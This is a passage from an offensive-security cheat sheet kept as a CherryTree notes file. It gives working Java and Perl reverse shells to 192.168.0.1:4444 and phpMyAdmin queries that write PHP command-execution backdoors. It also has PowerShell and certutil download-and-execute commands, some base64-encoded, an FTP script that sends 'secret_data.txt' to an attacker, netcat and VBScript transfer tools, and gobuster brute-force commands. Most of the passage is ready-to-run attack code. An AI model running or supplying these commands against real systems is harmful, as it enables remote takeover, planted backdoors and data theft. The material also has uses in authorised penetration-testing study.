          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
        </node>
        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1696697351">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



______________________________________________________________________________



</rich_text>
          <rich_text link="webs https://github.com/nigamelastic/cheat-sheets/blob/main/General/FTP.md#quick-ftp-transfer-from-windows-target-to-kali-attacker" scale="h2">Quick FTP transfer from windows target to kali attacker</rich_text>
          <rich_text>
Start FTP on Attacker Machine:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>&#13;    

On Target Machine Use the following to transfer the file to Attacker:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">atftpd --daemon --port 69 /var/tmp</codebox>
          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tftp -i 192.168.0.1 GET whoami.exe</codebox>
          <codebox char_offset="306" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python -m pyftpdlib -p 4444 -u yo -P 123 -w </codebox>
          <codebox char_offset="387" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PS C:\Users\nathan&gt; ftp&#13;
ftp&gt; open 192.168.119.185 4444&#13;
Connected to 192.168.119.185.&#13;
220 pyftpdlib 1.5.7 ready.&#13;
530 Log in with USER and PASS first.&#13;
User (192.168.119.185:(none)): yo&#13;
331 Username ok, send password.&#13;
Password:&#13;
230 Login successful.&#13;
ftp&gt; put jehe.jeher&#13;
200 Active data connection established.&#13;
125 Data connection already open. Transfer starting.&#13;
226 Transfer complete.&#13;
ftp: 52 bytes sent in 0.06Seconds 0.84Kbytes/sec.&#13;
ftp&gt;</codebox>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1689625596">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_______________________________________

</rich_text>
        <rich_text scale="h2">Using Proxy:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



________________________________________

</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

To ignore ssl certificate use </rich_text>
        <rich_text family="monospace">-k </rich_text>
        <rich_text>flag</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.100 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
        <codebox char_offset="161" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.10.10.100:3128 -e -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@10.10.10.100  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwarding</rich_text>
        <rich_text justification="left" scale="h2"></rich_text>
        <rich_text scale="h2">:</rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.10.10.100 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
